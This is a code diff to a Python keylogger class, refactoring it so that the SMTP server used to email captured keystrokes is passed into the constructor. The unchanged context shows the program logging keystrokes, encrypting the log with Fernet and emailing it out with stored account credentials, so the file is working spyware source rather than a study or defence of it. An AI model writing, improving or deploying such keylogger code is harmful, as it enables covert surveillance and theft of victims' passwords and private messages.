@@ -20,12 +20,13 @@ class Keylogger:
         Key.tab: "[TAB]",
         Key.backspace: "[BACKSPACE]"}
 
-    def __init__(self, email, password, time_interval, secret):
+    def __init__(self, email, password, time_interval, secret, server):
         self.interval = time_interval
         self.log = ""
         self.email = email
         self.password = password
         self.f = Fernet(secret)
+        self.server = server
 
     def update_log(self, str):
         self.log += str
@@ -41,7 +42,7 @@ class Keylogger:
         return self.f.encrypt(str.encode(self.log))
 
     def send_email(self, message):
-        server = SMTP(host=EMAIL_HOST, port=PORT)
+        server = self.server
         # connect to the SMTP server as TLS mode
         server.starttls()
         try:
@@ -76,7 +77,14 @@ class Keylogger:
 
 
 def main():
-    kl = Keylogger(EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_REPORT_EVERY, SECRET)
+    kl = Keylogger(
+        EMAIL_ADDRESS,
+        EMAIL_PASSWORD,
+        SEND_REPORT_EVERY,
+        SECRET,
+        SMTP(
+            host=EMAIL_HOST,
+            port=PORT))
     kl.start()
 
 
